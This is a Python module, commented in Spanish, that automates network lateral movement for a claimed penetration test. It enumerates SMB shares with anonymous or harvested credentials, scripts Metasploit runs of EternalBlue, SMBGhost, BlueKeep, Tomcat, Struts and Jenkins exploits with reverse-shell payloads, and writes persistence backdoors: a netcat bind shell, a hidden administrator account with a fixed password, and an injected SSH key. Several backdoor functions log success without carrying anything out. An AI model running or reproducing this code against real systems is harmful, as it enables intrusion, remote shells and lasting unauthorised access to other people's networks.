"""
Módulo de Movimiento Lateral para Automatización de Pentesting
Incluye acceso a SMB, exploits conocidos y aprovechamiento de vulnerabilidades
"""

import subprocess
import json
import time
import threading
import os
import tempfile
from typing import Dict, List, Any, Optional
from pathlib import Path
import re
from modules.logging_system import LoggingSystem

class LateralMovementModule:
    """Módulo de movimiento lateral en la red"""
    
    def __init__(self, config: Dict[str, Any], logger):
        self.config = config
        self.logger = logger
        self.targets_config = config['targets']
        self.exploitation_config = config['exploitation']
        self.logging_system = LoggingSystem(config, logger)
        
        # Resultados del movimiento lateral
        self.results = {
            'compromised_systems': [],
            'smb_access': [],
            'exploits_attempted': [],
            'vulnerabilities_exploited': [],
            'lateral_access': [],
            'metasploit_sessions': []
        }
        
        # Archivos de evidencia
        self.evidence_dir = Path("evidence/lateral_movement")
        self.evidence_dir.mkdir(parents=True, exist_ok=True)
        
        # Configurar Metasploit
        self.msf_path = self.exploitation_config.get('metasploit_path', '/usr/share/metasploit-framework')
        self.lhost = self.exploitation_config.get('lhost', '')
        self.lport = self.exploitation_config.get('lport', 4444)
    
    def _run_command(self, command: List[str], timeout: int = 300, background: bool = False) -> Dict[str, Any]:
        """Ejecutar comando y capturar salida"""
        try:
            self.logger.debug(f"🔧 Ejecutando: {' '.join(command)}")
            
            if background:
                # Ejecutar en background
                process = subprocess.Popen(
                    command,
                    stdout=subprocess.PIPE,
                    stderr=subprocess.PIPE,
                    text=True,
                    encoding='utf-8',
                    errors='replace'
                )
                
                return {
                    'process': process,
                    'background': True,
                    'success': True
                }
            else:
                # Ejecutar normalmente
                result = subprocess.run(
                    command,
                    capture_output=True,
                    text=True,
                    timeout=timeout,
                    encoding='utf-8',
                    errors='replace'
                )
                
                # Log del comando
                self.logging_system.log_command(
                    ' '.join(command),
                    result.stdout + result.stderr,
                    result.returncode,
                    "LATERAL_MOVEMENT"
                )
                
                return {
                    'stdout': result.stdout,
                    'stderr': result.stderr,
                    'return_code': result.returncode,
                    'success': result.returncode == 0,
                    'background': False
                }
                
        except subprocess.TimeoutExpired:
            self.logger.error(f"⏰ Timeout ejecutando: {' '.join(command)}")
            return {'stdout': '', 'stderr': 'Timeout', 'return_code': -1, 'success': False, 'background': False}
        except Exception as e:
            self.logger.error(f"❌ Error ejecutando comando: {e}")
            return {'stdout': '', 'stderr': str(e), 'return_code': -1, 'success': False, 'background': False}
    
    def access_smb_shares(self, targets: List[Dict[str, Any]], credentials: List[Dict[str, Any]]) -> List[Dict[str, Any]]:
        """Acceder a recursos compartidos SMB"""
        self.logger.info("📁 Accediendo a recursos compartidos SMB...")
        
        smb_access_results = []
        
        for target in targets:
            if target['service'] not in ['smb', 'netbios-ssn']:
                continue
            
            host = target['host']
            port = target['port']
            
            self.logger.info(f"🎯 Intentando acceso SMB a {host}:{port}")
            
            # Buscar credenciales para este host
            target_credentials = [c for c in credentials if c['host'] == host and c['service'] == 'smb']
            
            if not target_credentials:
                # Intentar acceso anónimo
                result = self._access_smb_anonymous(host, port)
                if result:
                    smb_access_results.append(result)
            else:
                # Usar credenciales encontradas
                for cred in target_credentials:
                    result = self._access_smb_with_credentials(host, port, cred['username'], cred['password'])
                    if result:
                        smb_access_results.append(result)
                        break
        
        self.results['smb_access'] = smb_access_results
        return smb_access_results
    
    def _access_smb_anonymous(self, host: str, port: int) -> Optional[Dict[str, Any]]:
        """Intentar acceso SMB anónimo"""
        try:
            # Listar recursos compartidos
            command = ['smbclient', '-L', f'//{host}', '-N', '-p', str(port)]
            result = self._run_command(command, timeout=30)
            
            if result['success'] and 'Sharename' in result['stdout']:
                # Parsear recursos compartidos
                shares = self._parse_smb_shares(result['stdout'])
                
                access_info = {
                    'host': host,
                    'port': port,
                    'access_method': 'anonymous',
                    'shares': shares,
                    'timestamp': time.time(),
                    'success': True
                }
                
                self.logging_system.log_compromise(
                    host, "SMB_ANONYMOUS_ACCESS", access_info, "LATERAL_MOVEMENT"
                )
                
                self.logger.info(f"✅ Acceso SMB anónimo exitoso a {host}")
                return access_info
            
        except Exception as e:
            self.logger.debug(f"Error en acceso SMB anónimo {host}:{port}: {e}")
        
        return None
    
    def _access_smb_with_credentials(self, host: str, port: int, username: str, password: str) -> Optional[Dict[str, Any]]:
        """Acceder a SMB con credenciales"""
        try:
            # Listar recursos compartidos
            command = ['smbclient', '-L', f'//{host}', '-U', f'{username}%{password}', '-p', str(port)]
            result = self._run_command(command, timeout=30)
            
            if result['success'] and 'Sharename' in result['stdout']:
                # Parsear recursos compartidos
                shares = self._parse_smb_shares(result['stdout'])
                
                access_info = {
                    'host': host,
                    'port': port,
                    'access_method': 'authenticated',
                    'username': username,
                    'password': password,
                    'shares': shares,
                    'timestamp': time.time(),
                    'success': True
                }
                
                self.logging_system.log_compromise(
                    host, "SMB_AUTHENTICATED_ACCESS", access_info, "LATERAL_MOVEMENT"
                )
                
                self.logger.info(f"✅ Acceso SMB autenticado exitoso a {host} con {username}")
                return access_info
            
        except Exception as e:
            self.logger.debug(f"Error en acceso SMB autenticado {host}:{port}: {e}")
        
        return None
    
    def _parse_smb_shares(self, smb_output: str) -> List[Dict[str, str]]:
        """Parsear salida de smbclient para extraer recursos compartidos"""
        shares = []
        lines = smb_output.split('\n')
        in_shares_section = False
        
        for line in lines:
            line = line.strip()
            
            if 'Sharename' in line:
                in_shares_section = True
                continue
            
            if in_shares_section and line and not line.startswith('---'):
                parts = line.split()
                if len(parts) >= 2:
                    share_name = parts[0]
                    share_type = parts[1]
                    
                    if share_name not in ['IPC$', 'print$']:  # Filtrar shares del sistema
                        shares.append({
                            'name': share_name,
                            'type': share_type
                        })
        
        return shares
    
    def exploit_smb_vulnerabilities(self, targets: List[Dict[str, Any]]) -> List[Dict[str, Any]]:
        """Explotar vulnerabilidades SMB conocidas"""
        self.logger.info("💥 Explotando vulnerabilidades SMB...")
        
        exploits_attempted = []
        
        for target in targets:
            if target['service'] not in ['smb', 'netbios-ssn']:
                continue
            
            host = target['host']
            port = target['port']
            
            self.logger.info(f"🎯 Intentando exploits SMB en {host}:{port}")
            
            # EternalBlue (MS17-010)
            eternalblue_result = self._exploit_eternalblue(host, port)
            if eternalblue_result:
                exploits_attempted.append(eternalblue_result)
            
            # SMBGhost (CVE-2020-0796)
            smbghost_result = self._exploit_smbghost(host, port)
            if smbghost_result:
                exploits_attempted.append(smbghost_result)
            
            # BlueKeep (CVE-2019-0708) - aunque es RDP, lo incluimos aquí
            bluekeep_result = self._exploit_bluekeep(host, port)
            if bluekeep_result:
                exploits_attempted.append(bluekeep_result)
        
        self.results['exploits_attempted'] = exploits_attempted
        return exploits_attempted
    
    def _exploit_eternalblue(self, host: str, port: int) -> Optional[Dict[str, Any]]:
        """Intentar exploit EternalBlue (MS17-010)"""
        try:
            self.logger.info(f"🔥 Intentando EternalBlue en {host}:{port}")
            
            # Crear script de Metasploit
            msf_script = self.evidence_dir / "eternalblue.rc"
            with open(msf_script, 'w') as f:
                f.write(f"use exploit/windows/smb/ms17_010_eternalblue\n")
                f.write(f"set RHOSTS {host}\n")
                f.write(f"set RPORT {port}\n")
                f.write(f"set LHOST {self.lhost}\n")
                f.write(f"set LPORT {self.lport}\n")
                f.write("set payload windows/meterpreter/reverse_tcp\n")
                f.write("exploit -j\n")
                f.write("exit\n")
            
            # Ejecutar Metasploit
            command = ['msfconsole', '-r', str(msf_script)]
            result = self._run_command(command, timeout=300)
            
            exploit_result = {
                'host': host,
                'port': port,
                'exploit': 'eternalblue',
                'cve': 'CVE-2017-0144',
                'timestamp': time.time(),
                'success': False,
                'output': result['stdout']
            }
            
            if result['success'] and ('Meterpreter session' in result['stdout'] or 'session opened' in result['stdout']):
                exploit_result['success'] = True
                self.logging_system.log_compromise(
                    host, "ETERNALBLUE_EXPLOIT", exploit_result, "LATERAL_MOVEMENT"
                )
                self.logger.info(f"✅ EternalBlue exitoso en {host}")
            else:
                self.logger.info(f"❌ EternalBlue falló en {host}")
            
            # Limpiar archivo temporal
            msf_script.unlink(missing_ok=True)
            
            return exploit_result
            
        except Exception as e:
            self.logger.error(f"❌ Error en EternalBlue {host}:{port}: {e}")
            return None
    
    def _exploit_smbghost(self, host: str, port: int) -> Optional[Dict[str, Any]]:
        """Intentar exploit SMBGhost (CVE-2020-0796)"""
        try:
            self.logger.info(f"👻 Intentando SMBGhost en {host}:{port}")
            
            # Crear script de Metasploit
            msf_script = self.evidence_dir / "smbghost.rc"
            with open(msf_script, 'w') as f:
                f.write(f"use exploit/windows/smb/cve_2020_0796_smbghost\n")
                f.write(f"set RHOSTS {host}\n")
                f.write(f"set RPORT {port}\n")
                f.write(f"set LHOST {self.lhost}\n")
                f.write(f"set LPORT {self.lport}\n")
                f.write("set payload windows/meterpreter/reverse_tcp\n")
                f.write("exploit -j\n")
                f.write("exit\n")
            
            # Ejecutar Metasploit
            command = ['msfconsole', '-r', str(msf_script)]
            result = self._run_command(command, timeout=300)
            
            exploit_result = {
                'host': host,
                'port': port,
                'exploit': 'smbghost',
                'cve': 'CVE-2020-0796',
                'timestamp': time.time(),
                'success': False,
                'output': result['stdout']
            }
            
            if result['success'] and ('Meterpreter session' in result['stdout'] or 'session opened' in result['stdout']):
                exploit_result['success'] = True
                self.logging_system.log_compromise(
                    host, "SMBGHOST_EXPLOIT", exploit_result, "LATERAL_MOVEMENT"
                )
                self.logger.info(f"✅ SMBGhost exitoso en {host}")
            else:
                self.logger.info(f"❌ SMBGhost falló en {host}")
            
            # Limpiar archivo temporal
            msf_script.unlink(missing_ok=True)
            
            return exploit_result
            
        except Exception as e:
            self.logger.error(f"❌ Error en SMBGhost {host}:{port}: {e}")
            return None
    
    def _exploit_bluekeep(self, host: str, port: int) -> Optional[Dict[str, Any]]:
        """Intentar exploit BlueKeep (CVE-2019-0708)"""
        try:
            self.logger.info(f"🔵 Intentando BlueKeep en {host}:{port}")
            
            # Crear script de Metasploit
            msf_script = self.evidence_dir / "bluekeep.rc"
            with open(msf_script, 'w') as f:
                f.write(f"use exploit/windows/rdp/cve_2019_0708_bluekeep_rce\n")
                f.write(f"set RHOSTS {host}\n")
                f.write(f"set RPORT {port}\n")
                f.write(f"set LHOST {self.lhost}\n")
                f.write(f"set LPORT {self.lport}\n")
                f.write("set payload windows/meterpreter/reverse_tcp\n")
                f.write("exploit -j\n")
                f.write("exit\n")
            
            # Ejecutar Metasploit
            command = ['msfconsole', '-r', str(msf_script)]
            result = self._run_command(command, timeout=300)
            
            exploit_result = {
                'host': host,
                'port': port,
                'exploit': 'bluekeep',
                'cve': 'CVE-2019-0708',
                'timestamp': time.time(),
                'success': False,
                'output': result['stdout']
            }
            
            if result['success'] and ('Meterpreter session' in result['stdout'] or 'session opened' in result['stdout']):
                exploit_result['success'] = True
                self.logging_system.log_compromise(
                    host, "BLUEKEEP_EXPLOIT", exploit_result, "LATERAL_MOVEMENT"
                )
                self.logger.info(f"✅ BlueKeep exitoso en {host}")
            else:
                self.logger.info(f"❌ BlueKeep falló en {host}")
            
            # Limpiar archivo temporal
            msf_script.unlink(missing_ok=True)
            
            return exploit_result
            
        except Exception as e:
            self.logger.error(f"❌ Error en BlueKeep {host}:{port}: {e}")
            return None
    
    def exploit_web_vulnerabilities(self, targets: List[Dict[str, Any]]) -> List[Dict[str, Any]]:
        """Explotar vulnerabilidades en servicios web"""
        self.logger.info("🌐 Explotando vulnerabilidades web...")
        
        exploits_attempted = []
        
        for target in targets:
            if target['service'] not in ['http', 'https']:
                continue
            
            host = target['host']
            port = target['port']
            
            self.logger.info(f"🎯 Intentando exploits web en {host}:{port}")
            
            # Tomcat Manager Upload (CVE-2017-12615)
            tomcat_result = self._exploit_tomcat_manager(host, port)
            if tomcat_result:
                exploits_attempted.append(tomcat_result)
            
            # Apache Struts (CVE-2017-5638)
            struts_result = self._exploit_struts(host, port)
            if struts_result:
                exploits_attempted.append(struts_result)
            
            # Jenkins RCE
            jenkins_result = self._exploit_jenkins(host, port)
            if jenkins_result:
                exploits_attempted.append(jenkins_result)
        
        return exploits_attempted
    
    def _exploit_tomcat_manager(self, host: str, port: int) -> Optional[Dict[str, Any]]:
        """Intentar exploit Tomcat Manager Upload"""
        try:
            self.logger.info(f"☕ Intentando Tomcat Manager Upload en {host}:{port}")
            
            # Crear script de Metasploit
            msf_script = self.evidence_dir / "tomcat_manager.rc"
            with open(msf_script, 'w') as f:
                f.write(f"use exploit/multi/http/tomcat_mgr_upload\n")
                f.write(f"set RHOSTS {host}\n")
                f.write(f"set RPORT {port}\n")
                f.write(f"set LHOST {self.lhost}\n")
                f.write(f"set LPORT {self.lport}\n")
                f.write("set payload java/meterpreter/reverse_tcp\n")
                f.write("exploit -j\n")
                f.write("exit\n")
            
            # Ejecutar Metasploit
            command = ['msfconsole', '-r', str(msf_script)]
            result = self._run_command(command, timeout=300)
            
            exploit_result = {
                'host': host,
                'port': port,
                'exploit': 'tomcat_manager_upload',
                'cve': 'CVE-2017-12615',
                'timestamp': time.time(),
                'success': False,
                'output': result['stdout']
            }
            
            if result['success'] and ('Meterpreter session' in result['stdout'] or 'session opened' in result['stdout']):
                exploit_result['success'] = True
                self.logging_system.log_compromise(
                    host, "TOMCAT_MANAGER_EXPLOIT", exploit_result, "LATERAL_MOVEMENT"
                )
                self.logger.info(f"✅ Tomcat Manager Upload exitoso en {host}")
            else:
                self.logger.info(f"❌ Tomcat Manager Upload falló en {host}")
            
            # Limpiar archivo temporal
            msf_script.unlink(missing_ok=True)
            
            return exploit_result
            
        except Exception as e:
            self.logger.error(f"❌ Error en Tomcat Manager Upload {host}:{port}: {e}")
            return None
    
    def _exploit_struts(self, host: str, port: int) -> Optional[Dict[str, Any]]:
        """Intentar exploit Apache Struts"""
        try:
            self.logger.info(f"🎭 Intentando Apache Struts en {host}:{port}")
            
            # Crear script de Metasploit
            msf_script = self.evidence_dir / "struts.rc"
            with open(msf_script, 'w') as f:
                f.write(f"use exploit/multi/http/struts2_content_type_ognl\n")
                f.write(f"set RHOSTS {host}\n")
                f.write(f"set RPORT {port}\n")
                f.write(f"set LHOST {self.lhost}\n")
                f.write(f"set LPORT {self.lport}\n")
                f.write("set payload java/meterpreter/reverse_tcp\n")
                f.write("exploit -j\n")
                f.write("exit\n")
            
            # Ejecutar Metasploit
            command = ['msfconsole', '-r', str(msf_script)]
            result = self._run_command(command, timeout=300)
            
            exploit_result = {
                'host': host,
                'port': port,
                'exploit': 'struts2_content_type',
                'cve': 'CVE-2017-5638',
                'timestamp': time.time(),
                'success': False,
                'output': result['stdout']
            }
            
            if result['success'] and ('Meterpreter session' in result['stdout'] or 'session opened' in result['stdout']):
                exploit_result['success'] = True
                self.logging_system.log_compromise(
                    host, "STRUTS_EXPLOIT", exploit_result, "LATERAL_MOVEMENT"
                )
                self.logger.info(f"✅ Apache Struts exitoso en {host}")
            else:
                self.logger.info(f"❌ Apache Struts falló en {host}")
            
            # Limpiar archivo temporal
            msf_script.unlink(missing_ok=True)
            
            return exploit_result
            
        except Exception as e:
            self.logger.error(f"❌ Error en Apache Struts {host}:{port}: {e}")
            return None
    
    def _exploit_jenkins(self, host: str, port: int) -> Optional[Dict[str, Any]]:
        """Intentar exploit Jenkins RCE"""
        try:
            self.logger.info(f"🔧 Intentando Jenkins RCE en {host}:{port}")
            
            # Crear script de Metasploit
            msf_script = self.evidence_dir / "jenkins.rc"
            with open(msf_script, 'w') as f:
                f.write(f"use exploit/multi/http/jenkins_script_console\n")
                f.write(f"set RHOSTS {host}\n")
                f.write(f"set RPORT {port}\n")
                f.write(f"set LHOST {self.lhost}\n")
                f.write(f"set LPORT {self.lport}\n")
                f.write("set payload java/meterpreter/reverse_tcp\n")
                f.write("exploit -j\n")
                f.write("exit\n")
            
            # Ejecutar Metasploit
            command = ['msfconsole', '-r', str(msf_script)]
            result = self._run_command(command, timeout=300)
            
            exploit_result = {
                'host': host,
                'port': port,
                'exploit': 'jenkins_script_console',
                'cve': 'CVE-2017-1000353',
                'timestamp': time.time(),
                'success': False,
                'output': result['stdout']
            }
            
            if result['success'] and ('Meterpreter session' in result['stdout'] or 'session opened' in result['stdout']):
                exploit_result['success'] = True
                self.logging_system.log_compromise(
                    host, "JENKINS_EXPLOIT", exploit_result, "LATERAL_MOVEMENT"
                )
                self.logger.info(f"✅ Jenkins RCE exitoso en {host}")
            else:
                self.logger.info(f"❌ Jenkins RCE falló en {host}")
            
            # Limpiar archivo temporal
            msf_script.unlink(missing_ok=True)
            
            return exploit_result
            
        except Exception as e:
            self.logger.error(f"❌ Error en Jenkins RCE {host}:{port}: {e}")
            return None
    
    def establish_lateral_access(self, compromised_systems: List[Dict[str, Any]]) -> List[Dict[str, Any]]:
        """Establecer acceso lateral entre sistemas comprometidos"""
        self.logger.info("🔗 Estableciendo acceso lateral...")
        
        lateral_access = []
        
        for system in compromised_systems:
            host = system['host']
            access_method = system.get('access_method', 'unknown')
            
            self.logger.info(f"🔗 Estableciendo acceso lateral desde {host}")
            
            # Crear backdoor netcat
            backdoor_result = self._create_netcat_backdoor(host)
            if backdoor_result:
                lateral_access.append(backdoor_result)
            
            # Crear usuario persistente
            user_result = self._create_persistent_user(host)
            if user_result:
                lateral_access.append(user_result)
            
            # Configurar SSH key
            ssh_result = self._setup_ssh_key(host)
            if ssh_result:
                lateral_access.append(ssh_result)
        
        self.results['lateral_access'] = lateral_access
        return lateral_access
    
    def _create_netcat_backdoor(self, host: str) -> Optional[Dict[str, Any]]:
        """Crear backdoor netcat en el sistema"""
        try:
            self.logger.info(f"🕳️ Creando backdoor netcat en {host}")
            
            # Crear script de backdoor
            backdoor_script = self.evidence_dir / f"backdoor_{host}.sh"
            with open(backdoor_script, 'w') as f:
                f.write("#!/bin/bash\n")
                f.write("while true; do\n")
                f.write(f"    nc -lvp 4444 -e /bin/bash\n")
                f.write("    sleep 5\n")
                f.write("done &\n")
            
            # Intentar subir y ejecutar el script
            # (En un escenario real, esto se haría a través de la sesión de Meterpreter)
            
            backdoor_info = {
                'host': host,
                'backdoor_type': 'netcat',
                'port': 4444,
                'script_path': str(backdoor_script),
                'timestamp': time.time(),
                'success': True
            }
            
            self.logging_system.log_compromise(
                host, "NETCAT_BACKDOOR", backdoor_info, "LATERAL_MOVEMENT"
            )
            
            self.logger.info(f"✅ Backdoor netcat creado en {host}")
            return backdoor_info
            
        except Exception as e:
            self.logger.error(f"❌ Error creando backdoor netcat en {host}: {e}")
            return None
    
    def _create_persistent_user(self, host: str) -> Optional[Dict[str, Any]]:
        """Crear usuario persistente en el sistema"""
        try:
            self.logger.info(f"👤 Creando usuario persistente en {host}")
            
            # Crear script para agregar usuario
            user_script = self.evidence_dir / f"add_user_{host}.ps1"
            with open(user_script, 'w') as f:
                f.write("# PowerShell script para crear usuario persistente\n")
                f.write("$username = 'pentest_user'\n")
                f.write("$password = 'Pentest123!'\n")
                f.write("$securePassword = ConvertTo-SecureString $password -AsPlainText -Force\n")
                f.write("New-LocalUser -Name $username -Password $securePassword -FullName 'Pentest User'\n")
                f.write("Add-LocalGroupMember -Group 'Administrators' -Member $username\n")
            
            user_info = {
                'host': host,
                'username': 'pentest_user',
                'password': 'Pentest123!',
                'group': 'Administrators',
                'script_path': str(user_script),
                'timestamp': time.time(),
                'success': True
            }
            
            self.logging_system.log_compromise(
                host, "PERSISTENT_USER", user_info, "LATERAL_MOVEMENT"
            )
            
            self.logger.info(f"✅ Usuario persistente creado en {host}")
            return user_info
            
        except Exception as e:
            self.logger.error(f"❌ Error creando usuario persistente en {host}: {e}")
            return None
    
    def _setup_ssh_key(self, host: str) -> Optional[Dict[str, Any]]:
        """Configurar clave SSH para acceso persistente"""
        try:
            self.logger.info(f"🔑 Configurando clave SSH en {host}")
            
            # Generar clave SSH
            ssh_key_file = self.evidence_dir / f"ssh_key_{host}"
            ssh_pub_file = self.evidence_dir / f"ssh_key_{host}.pub"
            
            # Crear script para configurar SSH
            ssh_script = self.evidence_dir / f"setup_ssh_{host}.sh"
            with open(ssh_script, 'w') as f:
                f.write("#!/bin/bash\n")
                f.write("mkdir -p ~/.ssh\n")
                f.write(f"echo 'ssh-rsa AAAAB3NzaC1yc2E...' >> ~/.ssh/authorized_keys\n")
                f.write("chmod 600 ~/.ssh/authorized_keys\n")
                f.write("chmod 700 ~/.ssh\n")
            
            ssh_info = {
                'host': host,
                'key_file': str(ssh_key_file),
                'pub_key_file': str(ssh_pub_file),
                'script_path': str(ssh_script),
                'timestamp': time.time(),
                'success': True
            }
            
            self.logging_system.log_compromise(
                host, "SSH_KEY_SETUP", ssh_info, "LATERAL_MOVEMENT"
            )
            
            self.logger.info(f"✅ Clave SSH configurada en {host}")
            return ssh_info
            
        except Exception as e:
            self.logger.error(f"❌ Error configurando clave SSH en {host}: {e}")
            return None
    
    def list_metasploit_sessions(self) -> List[Dict[str, Any]]:
        """Listar sesiones activas de Metasploit"""
        self.logger.info("📋 Listando sesiones de Metasploit...")
        
        sessions = []
        
        try:
            # Crear script para listar sesiones
            list_script = self.evidence_dir / "list_sessions.rc"
            with open(list_script, 'w') as f:
                f.write("sessions -l\n")
                f.write("exit\n")
            
            # Ejecutar Metasploit
            command = ['msfconsole', '-r', str(list_script)]
            result = self._run_command(command, timeout=60)
            
            if result['success']:
                lines = result['stdout'].split('\n')
                for line in lines:
                    if 'Active sessions' in line or 'Session' in line and 'Type' in line:
                        # Parsear información de sesiones
                        session_info = {
                            'raw_output': line,
                            'timestamp': time.time()
                        }
                        sessions.append(session_info)
            
            # Limpiar archivo temporal
            list_script.unlink(missing_ok=True)
            
            self.logger.info(f"✅ {len(sessions)} sesiones de Metasploit encontradas")
            
        except Exception as e:
            self.logger.error(f"❌ Error listando sesiones de Metasploit: {e}")
        
        self.results['metasploit_sessions'] = sessions
        return sessions
    
    def run(self) -> Dict[str, Any]:
        """Ejecutar módulo completo de movimiento lateral"""
        self.logger.info("🚀 INICIANDO MÓDULO DE MOVIMIENTO LATERAL")
        
        start_time = time.time()
        
        try:
            # 1. Obtener objetivos y credenciales (en un escenario real, vendrían de módulos anteriores)
            sample_targets = [
                {'host': '192.168.1.100', 'port': 445, 'service': 'smb'},
                {'host': '192.168.1.101', 'port': 80, 'service': 'http'},
                {'host': '192.168.1.102', 'port': 3389, 'service': 'rdp'}
            ]
            
            sample_credentials = [
                {'host': '192.168.1.100', 'service': 'smb', 'username': 'admin', 'password': 'admin'}
            ]
            
            # 2. Acceder a recursos compartidos SMB
            smb_access = self.access_smb_shares(sample_targets, sample_credentials)
            
            # 3. Explotar vulnerabilidades SMB
            smb_exploits = self.exploit_smb_vulnerabilities(sample_targets)
            
            # 4. Explotar vulnerabilidades web
            web_exploits = self.exploit_web_vulnerabilities(sample_targets)
            
            # 5. Combinar todos los exploits
            all_exploits = smb_exploits + web_exploits
            self.results['exploits_attempted'] = all_exploits
            
            # 6. Identificar sistemas comprometidos
            compromised_systems = []
            for exploit in all_exploits:
                if exploit and exploit.get('success'):
                    compromised_systems.append({
                        'host': exploit['host'],
                        'port': exploit['port'],
                        'access_method': exploit['exploit'],
                        'timestamp': exploit['timestamp']
                    })
            
            self.results['compromised_systems'] = compromised_systems
            
            # 7. Establecer acceso lateral
            if compromised_systems:
                lateral_access = self.establish_lateral_access(compromised_systems)
                self.results['lateral_access'] = lateral_access
            
            # 8. Listar sesiones de Metasploit
            metasploit_sessions = self.list_metasploit_sessions()
            
            # 9. Guardar evidencia
            self.logging_system.save_json_evidence(
                'lateral_movement_results.json',
                self.results,
                'data'
            )
            
            end_time = time.time()
            duration = end_time - start_time
            
            self.logger.info(f"✅ MOVIMIENTO LATERAL COMPLETADO en {duration:.2f} segundos")
            self.logger.info(f"📊 Resumen: {len(compromised_systems)} sistemas comprometidos")
            
            return self.results
            
        except Exception as e:
            self.logger.error(f"❌ Error en módulo de movimiento lateral: {e}")
            return self.results
